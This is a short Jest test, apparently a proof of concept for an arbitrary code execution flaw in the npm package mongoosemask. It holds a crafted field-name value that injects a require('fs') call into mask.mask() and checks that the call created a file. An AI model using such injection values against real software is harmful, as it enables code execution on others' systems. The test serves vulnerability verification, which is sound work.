//
test("Arbitrary code execution in mongoosemask", () => {
  const fs = require("fs");
  const mask = require("mongoosemask");
  const path = "./mongoosemask";

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  try {
    mask.mask({}, [
      'id"]; require(`fs`)["writeFileSync"](`mongoosemask`,``)//',
    ]);
  } catch (error) {}

  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
